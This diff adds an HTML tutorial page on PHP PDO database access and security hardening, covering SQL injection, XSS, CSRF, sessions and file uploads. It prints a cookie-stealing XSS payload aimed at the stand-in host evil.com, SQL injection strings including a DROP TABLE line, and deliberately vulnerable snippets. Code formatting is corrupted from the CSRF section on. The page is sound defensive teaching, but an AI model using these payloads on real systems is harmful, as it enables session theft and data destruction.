@@ -1,0 +1,1115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Core PHP - Database (PDO) & Security Hardening</title>
+    <link rel="stylesheet" href="./style.css">
+    <script src="./marked.min.js"></script>
+</head>
+<body>
+    <!-- Top Navigation -->
+    <div class="nav-bar">
+        <a href="02_Core_PHP_OOP_and_Advanced.html" class="nav-btn">&larr; Previous: OOP & Advanced</a>
+        <a href="../index.html" class="nav-btn hub-btn">🏠 Hub Index</a>
+        <a href="04_Core_PHP_APIs_and_Composer.html" class="nav-btn">Next: APIs & Composer &rarr;</a>
+    </div>
+
+    <!-- Rendered Markdown Container -->
+    <div id="content"></div>
+
+    <!-- Interactive Component 1: Secure File Upload Pipeline Simulator -->
+    <div class="lifecycle-stepper">
+        <h4 style="margin-top:0; border:none;">Interactive Secure File Upload Defense Pipeline</h4>
+        <p style="color:var(--text-muted); font-size:0.95rem;">
+            Click through each defensive layer of enterprise PHP file upload hardening to see how to prevent remote code execution (RCE) and path traversal attacks:
+        </p>
+
+        <div class="stepper-nav" id="uploadNav">
+            <button class="step-chip active" onclick="showUploadStep(0)">1. Error & Size Guard</button>
+            <button class="step-chip" onclick="showUploadStep(1)">2. Binary MIME Sniffing</button>
+            <button class="step-chip" onclick="showUploadStep(2)">3. Extension Whitelisting</button>
+            <button class="step-chip" onclick="showUploadStep(3)">4. Random Filename Generation</button>
+            <button class="step-chip" onclick="showUploadStep(4)">5. move_uploaded_file()</button>
+            <button class="step-chip" onclick="showUploadStep(5)">6. GD Re-encoding (Anti-EXIF)</button>
+        </div>
+
+        <div class="step-content-box" id="uploadContent">
+            <!-- Injected by JS -->
+        </div>
+    </div>
+
+    <!-- Interactive Component 2: Core PHP Security Exploit vs Defense Tabs -->
+    <div class="tab-container">
+        <div class="tab-header">
+            <button class="tab-btn active" onclick="switchSecTab(event, 'stab-sqli')">🛡️ 1. SQL Injection (PDO Prepared Statements)</button>
+            <button class="tab-btn" onclick="switchSecTab(event, 'stab-xss')">🛡️ 2. XSS & HTML Escaping</button>
+            <button class="tab-btn" onclick="switchSecTab(event, 'stab-timing')">🛡️ 3. CSRF & Timing Attacks (hash_equals)</button>
+        </div>
+
+        <div id="stab-sqli" class="tab-panel active">
+            <p style="color:#166534; font-weight:600;">SQLi Defense: Real Prepared Statements with Emulate Prepares Disabled.</p>
+            <pre><code class="language-php">&lt;?php
+// ❌ VULNERABLE: Direct string interpolation into SQL query!
+$email = $_POST['email']; // Attacker payload: ' OR '1'='1
+$sql = "SELECT * FROM users WHERE email = '$email'";
+$db->query($sql); // DUMP ENTIRE DATABASE!
+
+// ✅ SECURE: Real PDO Prepared Statements:
+$options = [
+    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
+    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+    PDO::ATTR_EMULATE_PREPARES   => false, // Critical: Enforces real server-side prepared statements!
+];
+$pdo = new PDO($dsn, $user, $pass, $options);
+
+// Parameter values are sent in a separate protocol packet from SQL grammar:
+$stmt = $pdo->prepare('SELECT id, name, password_hash FROM users WHERE email = :email AND status = :status');
+$stmt->execute([
+    ':email'  => $_POST['email'],
+    ':status' => 'active',
+]);
+$user = $stmt->fetch();
+?&gt;</code></pre>
+        </div>
+
+        <div id="stab-xss" class="tab-panel">
+            <p style="color:#0284C7; font-weight:600;">XSS Defense: htmlspecialchars with ENT_QUOTES and ENT_HTML5.</p>
+            <pre><code class="language-php">&lt;?php
+// ❌ VULNERABLE: Direct output of user input into HTML
+echo "&lt;h1&gt;Welcome, " . $_GET['name'] . "&lt;/h1&gt;";
+// Attacker sends: ?name=&lt;script&gt;document.location='http://evil.com?c='+document.cookie&lt;/script&gt;
+// Cookie stolen immediately!
+
+// ✅ SECURE: Universal HTML Escaping Helper
+function e(string $value): string {
+    return htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+}
+
+// In HTML template:
+?&gt;
+&lt;h1&gt;Welcome, &lt;?= e($_GET['name'] ?? 'Guest') ?&gt;&lt;/h1&gt;
+&lt;!-- Rendered output: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; (Safe text, NOT executed!) --&gt;
+&lt;?php
+
+// For Rich Text (HTML WYSIWYG Editors), use HTMLPurifier:
+$purifier = new HTMLPurifier();
+$cleanHtml = $purifier->purify($_POST['blog_content']); // Allows &lt;b&gt;, &lt;i&gt;, &lt;p&gt; but strips &lt;script&gt;, onclick
+?&gt;</code></pre>
+        </div>
+
+        <div id="stab-timing" class="tab-panel">
+            <p style="color:#581C87; font-weight:600;">Timing Attack Defense: hash_equals() constant-time comparison.</p>
+            <pre><code class="language-php">&lt;?php
+// ❌ VULNERABLE: Standard '===' comparison terminates on the FIRST mismatched byte!
+if ($_POST['csrf_token'] === $_SESSION['csrf_token']) { ... }
+// Attacker measures response time in nanoseconds to guess token character-by-character!
+
+// ✅ SECURE: hash_equals() executes in CONSTANT TIME regardless of match:
+function validateCsrf(string $submittedToken): bool {
+    $knownToken = $_SESSION['csrf_token'] ?? '';
+    
+    if (empty($knownToken) || empty($submittedToken)) {
+        return false;
+    }
+
+    return hash_equals($knownToken, $submittedToken); // Constant execution time!
+}
+
+// Generating CSRF Token:
+function generateCsrf(): string {
+    if (empty($_SESSION['csrf_token'])) {
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // Cryptographically secure 64-char token
+    }
+    return $_SESSION['csrf_token'];
+}
+?&gt;</code></pre>
+        </div>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="nav-bar">
+        <a href="02_Core_PHP_OOP_and_Advanced.html" class="nav-btn">&larr; Previous: OOP & Advanced</a>
+        <a href="../index.html" class="nav-btn hub-btn">🏠 Hub Index</a>
+        <a href="04_Core_PHP_APIs_and_Composer.html" class="nav-btn">Next: APIs & Composer &rarr;</a>
+    </div>
+
+    <!-- Raw Markdown Document -->
+    <textarea id="markdown-content" style="display:none; white-space:pre;">
+
+### Core PHP — Database with PDO & Security Hardening
+
+Security is not optional in backend development — it is the foundation. This file covers the **only correct** way to interact with databases in PHP using PDO, and the critical security techniques every PHP developer must know by heart. These patterns are exactly what Laravel's Eloquent and Query Builder implement under the hood.
+
+> **20 YOE Expert Tip:** 90% of PHP security vulnerabilities come from three mistakes — SQL Injection, XSS, and improper password storage. Master this file and you will write code that can pass a professional security audit.
+
+---
+
+#### 1. PDO — PHP Data Objects (The Right Way to Use Databases)
+
+PDO (PHP Data Objects) is the **database-agnostic** extension for PHP. It works with MySQL, PostgreSQL, SQLite, MSSQL — the same API, just change the DSN string.
+
+##### 1.1 Connecting to a Database
+
+```php
+<?php
+
+// DSN = Data Source Name — specifies the driver and connection details
+// MySQL
+$dsn = 'mysql:host=127.0.0.1;port=3306;dbname=myapp;charset=utf8mb4';
+
+// PostgreSQL
+// $dsn = 'pgsql:host=127.0.0.1;port=5432;dbname=myapp';
+
+// SQLite (file-based — great for testing)
+// $dsn = 'sqlite:/path/to/database.sqlite';
+
+$username = 'db_user';
+$password = 'db_secret_password';
+
+// PDO options — always set these!
+$options = [
+    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,   // Throw exceptions on errors
+    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,         // Return arrays by default
+    PDO::ATTR_EMULATE_PREPARES   => false,                    // Use real prepared statements!
+    PDO::MYSQL_ATTR_FOUND_ROWS   => true,                     // MySQL: count matched rows in UPDATE
+];
+
+try {
+    $pdo = new PDO($dsn, $username, $password, $options);
+    echo "Connected successfully!";
+} catch (PDOException $e) {
+    // NEVER log or display $e->getMessage() to users in production — it exposes credentials!
+    error_log("DB Connection failed: " . $e->getMessage());
+    throw new \RuntimeException("Database connection failed.", 500, $e);
+}
+?>
+```
+
+##### 1.2 Singleton Database Connection (Production Pattern)
+
+```php
+<?php
+
+class Database {
+    private static ?PDO $connection = null;
+
+    public static function getConnection(): PDO {
+        if (self::$connection === null) {
+            $dsn = sprintf(
+                'mysql:host=%s;port=%d;dbname=%s;charset=utf8mb4',
+                $_ENV['DB_HOST']     ?? 'localhost',
+                $_ENV['DB_PORT']     ?? 3306,
+                $_ENV['DB_DATABASE'] ?? 'myapp'
+            );
+            self::$connection = new PDO(
+                $dsn,
+                $_ENV['DB_USERNAME'] ?? 'root',
+                $_ENV['DB_PASSWORD'] ?? '',
+                [
+                    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
+                    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+                    PDO::ATTR_EMULATE_PREPARES   => false,
+                ]
+            );
+        }
+        return self::$connection;
+    }
+}
+
+// Usage anywhere in the app
+$pdo = Database::getConnection();
+?>
+```
+
+---
+
+#### 2. SQL Injection — The #1 Security Vulnerability
+
+SQL Injection happens when user input is directly concatenated into an SQL query. This is the most critical PHP mistake.
+
+##### ❌ VULNERABLE — Never Do This
+
+```php
+<?php
+// VULNERABLE CODE — DO NOT USE IN PRODUCTION EVER
+$username = $_POST['username'];  // Attacker sends: ' OR '1'='1
+$password = $_POST['password'];
+
+// This SQL becomes: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
+// It logs in the attacker without a valid password!
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = $pdo->query($query);  // DANGEROUS!
+
+// Even worse — attacker can send: '; DROP TABLE users; --
+// This DELETES your entire users table!
+?>
+```
+
+##### ✅ SAFE — Prepared Statements (Always Use This)
+
+```php
+<?php
+$pdo = Database::getConnection();
+
+// Method 1: Named placeholders (recommended — more readable)
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND is_active = :active");
+$stmt->execute([
+    ':username' => $_POST['username'],  // PDO escapes this safely — injection impossible
+    ':active'   => true,
+]);
+$user = $stmt->fetch();  // Returns one row as associative array, or false
+
+// Method 2: Positional placeholders (? markers)
+$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? AND deleted_at IS NULL");
+$stmt->execute([$_POST['email']]);
+$user = $stmt->fetch();
+
+// Fetch all rows
+$stmt = $pdo->prepare("SELECT id, name, email, role FROM users WHERE role = :role ORDER BY name");
+$stmt->execute([':role' => 'admin']);
+$admins = $stmt->fetchAll();  // Returns array of all matching rows
+
+// Fetch single column value
+$stmt = $pdo->prepare("SELECT COUNT(*) FROM orders WHERE user_id = :id");
+$stmt->execute([':id' => $userId]);
+$count = $stmt->fetchColumn();  // Returns just the count value
+echo "Total orders: $count";
+?>
+```
+
+<span class="hinglish">Prepared Statements mein SQL aur Data alag bheje jaate hain database ko. Pehle SQL ka structure database ko samjhaya jaata hai, phir data alag se diya jaata hai. Isliye koi bhi malicious data SQL structure ko change nahi kar sakta. Laravel ka `->where('email', $email)` internally yahi karta hai!</span>
+
+---
+
+#### 3. Complete CRUD Operations with PDO
+
+```php
+<?php
+
+class UserRepository {
+    public function __construct(private PDO $pdo) {}
+
+    // CREATE
+    public function create(array $data): int {
+        $stmt = $this->pdo->prepare(
+            "INSERT INTO users (name, email, password, role, created_at)
+             VALUES (:name, :email, :password, :role, NOW())"
+        );
+        $stmt->execute([
+            ':name'     => $data['name'],
+            ':email'    => $data['email'],
+            ':password' => password_hash($data['password'], PASSWORD_BCRYPT),
+            ':role'     => $data['role'] ?? 'user',
+        ]);
+        return (int) $this->pdo->lastInsertId();  // Returns the new row's ID
+    }
+
+    // READ — Find by ID
+    public function findById(int $id): ?array {
+        $stmt = $this->pdo->prepare(
+            "SELECT id, name, email, role, created_at FROM users WHERE id = :id AND deleted_at IS NULL"
+        );
+        $stmt->execute([':id' => $id]);
+        $result = $stmt->fetch();
+        return $result ?: null;  // Return null if not found
+    }
+
+    // READ — Find by email
+    public function findByEmail(string $email): ?array {
+        $stmt = $this->pdo->prepare(
+            "SELECT * FROM users WHERE email = :email AND deleted_at IS NULL LIMIT 1"
+        );
+        $stmt->execute([':email' => $email]);
+        return $stmt->fetch() ?: null;
+    }
+
+    // READ — Get all with pagination
+    public function paginate(int $page = 1, int $perPage = 15, string $role = '%'): array {
+        $offset = ($page - 1) * $perPage;
+
+        $stmt = $this->pdo->prepare(
+            "SELECT id, name, email, role, created_at
+             FROM users
+             WHERE deleted_at IS NULL AND role LIKE :role
+             ORDER BY created_at DESC
+             LIMIT :limit OFFSET :offset"
+        );
+        // bindValue needed for integer params with LIMIT/OFFSET
+        $stmt->bindValue(':role',   $role,    PDO::PARAM_STR);
+        $stmt->bindValue(':limit',  $perPage, PDO::PARAM_INT);
+        $stmt->bindValue(':offset', $offset,  PDO::PARAM_INT);
+        $stmt->execute();
+
+        $countStmt = $this->pdo->prepare(
+            "SELECT COUNT(*) FROM users WHERE deleted_at IS NULL AND role LIKE :role"
+        );
+        $countStmt->execute([':role' => $role]);
+        $total = (int) $countStmt->fetchColumn();
+
+        return [
+            'data'         => $stmt->fetchAll(),
+            'total'        => $total,
+            'per_page'     => $perPage,
+            'current_page' => $page,
+            'last_page'    => (int) ceil($total / $perPage),
+        ];
+    }
+
+    // UPDATE
+    public function update(int $id, array $data): bool {
+        $stmt = $this->pdo->prepare(
+            "UPDATE users SET name = :name, email = :email, updated_at = NOW()
+             WHERE id = :id AND deleted_at IS NULL"
+        );
+        $stmt->execute([
+            ':name'  => $data['name'],
+            ':email' => $data['email'],
+            ':id'    => $id,
+        ]);
+        return $stmt->rowCount() > 0;  // true if a row was actually changed
+    }
+
+    // SOFT DELETE — mark as deleted, don't actually remove
+    public function softDelete(int $id): bool {
+        $stmt = $this->pdo->prepare(
+            "UPDATE users SET deleted_at = NOW() WHERE id = :id AND deleted_at IS NULL"
+        );
+        $stmt->execute([':id' => $id]);
+        return $stmt->rowCount() > 0;
+    }
+
+    // HARD DELETE — permanently remove (use carefully!)
+    public function forceDelete(int $id): bool {
+        $stmt = $this->pdo->prepare("DELETE FROM users WHERE id = :id");
+        $stmt->execute([':id' => $id]);
+        return $stmt->rowCount() > 0;
+    }
+}
+?>
+```
+
+---
+
+#### 4. Transactions — All or Nothing
+
+Use transactions when multiple queries must succeed together. If any one fails, roll everything back:
+
+```php
+<?php
+
+function transferMoney(PDO $pdo, int $fromId, int $toId, float $amount): bool {
+    // Check sufficient balance first
+    $stmt = $pdo->prepare("SELECT balance FROM accounts WHERE id = :id FOR UPDATE");
+    // FOR UPDATE locks the row during the transaction
+
+    $pdo->beginTransaction();
+
+    try {
+        // Check sender's balance
+        $stmt->execute([':id' => $fromId]);
+        $sender = $stmt->fetch();
+
+        if (!$sender || $sender['balance'] < $amount) {
+            throw new \RuntimeException("Insufficient balance!");
+        }
+
+        // Deduct from sender
+        $deduct = $pdo->prepare("UPDATE accounts SET balance = balance - :amount WHERE id = :id");
+        $deduct->execute([':amount' => $amount, ':id' => $fromId]);
+
+        // Add to receiver
+        $credit = $pdo->prepare("UPDATE accounts SET balance = balance + :amount WHERE id = :id");
+        $credit->execute([':amount' => $amount, ':id' => $toId]);
+
+        // Log the transfer
+        $log = $pdo->prepare(
+            "INSERT INTO transfer_log (from_id, to_id, amount, transferred_at)
+             VALUES (:from, :to, :amount, NOW())"
+        );
+        $log->execute([':from' => $fromId, ':to' => $toId, ':amount' => $amount]);
+
+        // All queries succeeded — commit!
+        $pdo->commit();
+        return true;
+
+    } catch (\Exception $e) {
+        // Any failure — rollback ALL changes as if nothing happened
+        $pdo->rollBack();
+        error_log("Transfer failed: " . $e->getMessage());
+        throw $e;
+    }
+}
+
+// Usage
+try {
+    transferMoney($pdo, fromId: 101, toId: 202, amount: 5000.00);
+    echo "Transfer successful!";
+} catch (\RuntimeException $e) {
+    echo "Transfer failed: " . $e->getMessage();
+}
+?>
+```
+
+<span class="hinglish">Transaction ka simple rule hai: Ya toh sab kuch hoga, ya kuch bhi nahi hoga. Bank transfer ka example perfect hai — agar sender se paise kata aur receiver ko credit karte waqt server crash hua, toh bina transaction ke paise ud jayenge! `beginTransaction()`, `commit()`, aur `rollBack()` yeh trifecta hamesha saath use karo.</span>
+
+---
+
+#### 5. Password Hashing — The Only Correct Way
+
+```php
+<?php
+
+// ✅ CORRECT — Always use password_hash() with PASSWORD_BCRYPT or PASSWORD_ARGON2ID
+$rawPassword = "MySecret@123";
+
+// Hashing — NEVER store raw passwords in the database
+$hashed = password_hash($rawPassword, PASSWORD_BCRYPT);
+// Output: $2y$10$5GzM... (includes algorithm, cost, and salt — all in one string)
+
+// PASSWORD_ARGON2ID — more secure, use on modern PHP 7.3+ servers
+$hashed2 = password_hash($rawPassword, PASSWORD_ARGON2ID, [
+    'memory_cost' => PASSWORD_ARGON2_DEFAULT_MEMORY_COST,  // 65536 KB
+    'time_cost'   => PASSWORD_ARGON2_DEFAULT_TIME_COST,    // 4 iterations
+    'threads'     => PASSWORD_ARGON2_DEFAULT_THREADS,      // 1 thread
+]);
+
+// Verifying — NEVER compare passwords with == or ===
+$isValid = password_verify($rawPassword, $hashed);  // true ✅
+$isInvalid = password_verify("WrongPassword", $hashed);  // false ✅
+
+// Rehashing — check if the hash needs upgrading (algorithm/cost changed)
+if (password_needs_rehash($hashed, PASSWORD_ARGON2ID)) {
+    $newHash = password_hash($rawPassword, PASSWORD_ARGON2ID);
+    // Save $newHash to database
+}
+
+// ❌ WRONG — NEVER do any of these:
+// $stored = md5($password);          // MD5 is BROKEN — cracked in seconds
+// $stored = sha1($password);         // SHA1 is BROKEN
+// $stored = hash('sha256', $password); // Even SHA256 is wrong without salt+cost factor
+// if ($password === $storedHash) ...  // Never compare raw with hash!
+?>
+```
+
+##### Complete Login Flow with PDO
+
+```php
+<?php
+
+function loginUser(PDO $pdo, string $email, string $rawPassword): ?array {
+    // 1. Validate inputs first (before hitting DB)
+    if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        throw new \InvalidArgumentException("Invalid email format.");
+    }
+    if (strlen($rawPassword) < 6 || strlen($rawPassword) > 72) {
+        throw new \InvalidArgumentException("Invalid password length.");
+    }
+
+    // 2. Find user by email — always use prepared statements
+    $stmt = $pdo->prepare(
+        "SELECT id, name, email, password, role, is_active, failed_attempts, locked_until
+         FROM users WHERE email = :email AND deleted_at IS NULL LIMIT 1"
+    );
+    $stmt->execute([':email' => $email]);
+    $user = $stmt->fetch();
+
+    // 3. Use constant-time comparison for "not found" (prevent timing attacks)
+    if (!$user) {
+        password_verify("dummy", '$2y$10$invalidhashpadding000000000000000000000000000000000000u');
+        // Run password_verify even on failure to take same time (timing attack prevention)
+        return null;
+    }
+
+    // 4. Check account lock (brute force protection)
+    if ($user['locked_until'] && strtotime($user['locked_until']) > time()) {
+        $remaining = ceil((strtotime($user['locked_until']) - time()) / 60);
+        throw new \RuntimeException("Account locked. Try again in {$remaining} minutes.");
+    }
+
+    // 5. Verify password
+    if (!password_verify($rawPassword, $user['password'])) {
+        // Increment failed attempts
+        $attempts = $user['failed_attempts'] + 1;
+        $lockUntil = $attempts >= 5 ? date('Y-m-d H:i:s', strtotime('+30 minutes')) : null;
+
+        $pdo->prepare("UPDATE users SET failed_attempts = :attempts, locked_until = :lock WHERE id = :id")
+            ->execute([':attempts' => $attempts, ':lock' => $lockUntil, ':id' => $user['id']]);
+
+        return null;
+    }
+
+    // 6. Success — reset failed attempts, rehash if needed
+    if (!$user['is_active']) {
+        throw new \RuntimeException("Account is inactive. Please verify your email.");
+    }
+
+    $updateData = [':attempts' => 0, ':lock' => null, ':id' => $user['id']];
+    $pdo->prepare("UPDATE users SET failed_attempts = :attempts, locked_until = :lock, last_login_at = NOW() WHERE id = :id")
+        ->execute($updateData);
+
+    // 7. Return safe user data (NEVER return password hash!)
+    unset($user['password'], $user['failed_attempts'], $user['locked_until']);
+    return $user;
+}
+?>
+```
+
+---
+
+#### 6. Input Validation & Sanitization
+
+##### Never Trust User Input — Always Validate + Sanitize
+
+```php
+<?php
+
+// filter_var — PHP's built-in validation/sanitization
+$email = $_POST['email'] ?? '';
+
+// Validate (check if format is correct)
+if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+    throw new \InvalidArgumentException("Invalid email address.");
+}
+
+// Sanitize (clean the value)
+$cleanEmail = filter_var($email, FILTER_SANITIZE_EMAIL);  // Removes illegal characters
+
+// Common FILTER_VALIDATE_* constants
+filter_var("42", FILTER_VALIDATE_INT);          // "42" → 42 (valid)
+filter_var("3.14", FILTER_VALIDATE_FLOAT);      // Valid
+filter_var("https://example.com", FILTER_VALIDATE_URL); // Valid
+filter_var("192.168.1.1", FILTER_VALIDATE_IP);  // Valid IPv4
+filter_var("on", FILTER_VALIDATE_BOOLEAN);      // true
+
+// Range validation
+filter_var(25, FILTER_VALIDATE_INT, ['options' => ['min_range' => 18, 'max_range' => 100]]);
+// 25 → valid (18-100 range). 15 → false (out of range)
+
+// Common FILTER_SANITIZE_* constants
+filter_var("<script>alert(1)<\/script>", FILTER_SANITIZE_SPECIAL_CHARS);
+// &lt;script&gt;alert(1)&lt;/script&gt; — safe for display
+
+filter_var("Hello <b>World</b>!", FILTER_SANITIZE_STRIPPED); // "Hello World!"
+filter_var("  hello  ", FILTER_SANITIZE_STRIPPED);            // "hello"
+
+// filter_input — directly reads from $_GET, $_POST, $_COOKIE (safer!)
+$age   = filter_input(INPUT_POST, 'age', FILTER_VALIDATE_INT,
+             ['options' => ['min_range' => 0, 'max_range' => 150]]);
+
+$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
+
+// Custom validation function
+function validateUserInput(array $data): array {
+    $errors = [];
+
+    // Name validation
+    $name = trim($data['name'] ?? '');
+    if (empty($name))                   $errors['name'][] = "Name is required.";
+    if (strlen($name) < 2)             $errors['name'][] = "Name must be at least 2 characters.";
+    if (strlen($name) > 100)           $errors['name'][] = "Name must not exceed 100 characters.";
+    if (!preg_match('/^[\p{L}\s\'-]+$/u', $name))  $errors['name'][] = "Name contains invalid characters.";
+
+    // Email validation
+    $email = trim(strtolower($data['email'] ?? ''));
+    if (empty($email))                             $errors['email'][] = "Email is required.";
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) $errors['email'][] = "Invalid email format.";
+    if (strlen($email) > 255)                      $errors['email'][] = "Email is too long.";
+
+    // Password validation
+    $password = $data['password'] ?? '';
+    if (strlen($password) < 8)         $errors['password'][] = "Password must be at least 8 characters.";
+    if (strlen($password) > 72)        $errors['password'][] = "Password is too long (max 72 chars).";
+    if (!preg_match('/[A-Z]/', $password)) $errors['password'][] = "Password needs an uppercase letter.";
+    if (!preg_match('/[0-9]/', $password)) $errors['password'][] = "Password needs a number.";
+    if (!preg_match('/[\W_]/', $password)) $errors['password'][] = "Password needs a special character.";
+
+    if (!empty($errors)) {
+        throw new \InvalidArgumentException(json_encode($errors));
+    }
+
+    return ['name' => $name, 'email' => $email, 'password' => $password];
+}
+?>
+```
+
+---
+
+#### 7. XSS — Cross-Site Scripting Prevention
+
+XSS occurs when user-supplied data is output to HTML without escaping:
+
+```php
+<?php
+
+// ❌ VULNERABLE — directly echoing user input
+$name = $_GET['name'];  // Attacker sends: <script>document.location='http://evil.com?c='+document.cookie<\/script>
+echo "Hello, $name!";  // Browser executes the script — steals cookies!
+
+// ✅ SAFE — always escape output with htmlspecialchars()
+$name = $_GET['name'] ?? '';
+echo "Hello, " . htmlspecialchars($name, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "!";
+// <script>...becomes & lt; script & gt;... — safe for display!
+
+// Create a reusable escape helper
+function e(string $value): string {
+            return htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+        }
+
+            // Use it in HTML output
+            ?>
+<div class="user-profile">
+    <h3><?= e($user['name']) ?></h3>
+    <p>Email: <?= e($user['email']) ?></p>
+    <p>Bio: <?= e($user['bio']) ?></p>
+</div>
+<?php
+
+// For rich text (HTML content) — use HTMLPurifier library
+// composer require ezyang/htmlpurifier
+$purifier = new \HTMLPurifier();
+    $safeBio = $purifier -> purify($user['bio']); // Allows <b>, <i> but strips <script>
+echo $safeBio;
+
+    // Content Security Policy header — second layer of XSS defense
+    header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';");
+?>
+        ```
+
+---
+
+#### 8. CSRF — Cross-Site Request Forgery Prevention
+
+CSRF tricks authenticated users into unknowingly submitting requests to your app:
+
+```php
+        <? php
+session_start();
+
+    // Generate CSRF token — store in session, embed in every form
+    function generateCsrfToken(): string {
+        if (empty($_SESSION['csrf_token'])) {
+            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+        }
+        return $_SESSION['csrf_token'];
+    }
+
+    // Validate CSRF token on form submission
+    function validateCsrfToken(string $submittedToken): void {
+        $storedToken = $_SESSION['csrf_token'] ?? '';
+
+        if (empty($submittedToken) || !hash_equals($storedToken, $submittedToken)) {
+            // hash_equals() is timing-attack safe — NEVER use == or ===
+            http_response_code(403);
+            throw new \RuntimeException("Invalid CSRF token. Possible CSRF attack detected.");
+        }
+
+        // Rotate token after validation (token rotation pattern)
+        unset($_SESSION['csrf_token']);
+    }
+
+// In your HTML form:
+?>
+        <form method="POST" action="/transfer">
+            <input type="hidden" name="csrf_token" value="<?= e(generateCsrfToken()) ?>">
+                <input type="number" name="amount" placeholder="Amount">
+                    <button type="submit">Transfer</button>
+                </form>
+                <?php
+
+                // In your form handler:
+                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+                    validateCsrfToken($_POST['csrf_token'] ?? '');
+    // Process the form safely...
+}
+?>
+                ```
+
+                ---
+
+                #### 9. Sessions — Secure Configuration
+
+                ```php
+                <?php
+
+                // Configure sessions BEFORE session_start()
+                ini_set('session.cookie_httponly', 1);   // JS cannot read session cookie
+                ini_set('session.cookie_secure', 1);    // Only send over HTTPS
+                ini_set('session.cookie_samesite', 'Strict'); // CSRF protection
+                ini_set('session.use_strict_mode', 1);  // Reject uninitialized session IDs
+                ini_set('session.gc_maxlifetime', 3600); // 1 hour session lifetime
+
+                session_start();
+
+                // Session Fixation Attack Prevention — regenerate ID after login!
+                function loginAndStartSession(array $user): void {
+                    session_regenerate_id(true);  // Generate new session ID, destroy old one
+
+                $_SESSION['user_id']    = $user['id'];
+                $_SESSION['user_email'] = $user['email'];
+                $_SESSION['user_role']  = $user['role'];
+                $_SESSION['logged_in_at'] = time();
+
+                // Fingerprint the session to detect hijacking
+                $_SESSION['fingerprint'] = hash('sha256',
+                $_SERVER['HTTP_USER_AGENT'] . $_SERVER['REMOTE_ADDR']
+                );
+}
+
+                // Session hijacking detection — validate fingerprint on every request
+                function validateSession(): bool {
+    if (!isset($_SESSION['user_id'])) {
+        return false;  // Not logged in
+    }
+
+    // Check if session expired
+    if (time() - ($_SESSION['logged_in_at'] ?? 0) > 3600) {
+                    session_destroy();
+                return false;
+    }
+
+                // Check fingerprint (catches stolen session cookies from different IPs/browsers)
+                $expectedFingerprint = hash('sha256',
+                $_SERVER['HTTP_USER_AGENT'] . $_SERVER['REMOTE_ADDR']
+                );
+                if ($_SESSION['fingerprint'] !== $expectedFingerprint) {
+                    session_destroy();
+                return false;
+    }
+
+    // Idle timeout — log out if inactive for 30 minutes
+    if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity']) > 1800) {
+                    session_destroy();
+                return false;
+    }
+
+                $_SESSION['last_activity'] = time();
+                return true;
+}
+
+                // Secure Logout
+                function logout(): void {
+                    $_SESSION = [];  // Clear all session variables
+
+                // Delete the session cookie
+                if (ini_get('session.use_cookies')) {
+                    $params = session_get_cookie_params();
+                setcookie(session_name(), '', time() - 42000,
+                $params['path'], $params['domain'],
+                $params['secure'], $params['httponly']
+                );
+    }
+
+                session_destroy();
+}
+?>
+                ```
+
+                <span class="hinglish">Session Fixation ek serious attack hai. Isme attacker pehle aapko ek known session ID ke saath bheejta hai, aur jab aap login karte ho tab woh session ID use karke aapke account mein ghus jaata hai. `session_regenerate_id(true)` login ke baad yahi attack rok deta hai. Laravel automatically yeh karta hai apne `Auth::login()` mein!</span>
+
+                ---
+
+                #### 10. File Upload Security
+
+                ```php
+                <?php
+
+                function handleSecureUpload(array $file, string $uploadDir = 'uploads/'): string {
+    // 1. Check for upload errors
+    if ($file['error'] !== UPLOAD_ERR_OK) {
+                    $errors = [
+                        UPLOAD_ERR_INI_SIZE => "File exceeds server upload limit.",
+                        UPLOAD_ERR_FORM_SIZE => "File exceeds form upload limit.",
+                        UPLOAD_ERR_PARTIAL => "File was only partially uploaded.",
+                        UPLOAD_ERR_NO_FILE => "No file was uploaded.",
+                        UPLOAD_ERR_NO_TMP_DIR => "Server temp directory missing.",
+                        UPLOAD_ERR_CANT_WRITE => "Failed to write file to disk.",
+                        UPLOAD_ERR_EXTENSION => "Upload blocked by PHP extension.",
+                    ];
+                throw new \RuntimeException($errors[$file['error']] ?? "Unknown upload error.");
+    } 
+
+                // 2. Validate file size (max 5MB)
+                $maxSize = 5 * 1024 * 1024;  // 5MB in bytes
+    if ($file['size'] > $maxSize) {
+        throw new \RuntimeException("File too large. Maximum size is 5MB.");
+    }
+
+                // 3. Validate MIME type — read actual file contents, NOT user-supplied MIME
+                // NEVER trust $file['type'] — it can be spoofed!
+                $finfo    = new finfo(FILEINFO_MIME_TYPE);
+    $mimeType = $finfo->file($file['tmp_name']);  // Read real MIME from file contents
+
+                $allowedTypes = [
+        'image/jpeg' => 'jpg',
+        'image/png'  => 'png',
+        'image/gif'  => 'gif',
+        'image/webp' => 'webp',
+        'application/pdf' => 'pdf',
+                ];
+
+                if (!array_key_exists($mimeType, $allowedTypes)) {
+        throw new \RuntimeException("File type '$mimeType' is not allowed.");
+    }
+
+                // 4. Validate file extension — must match MIME type
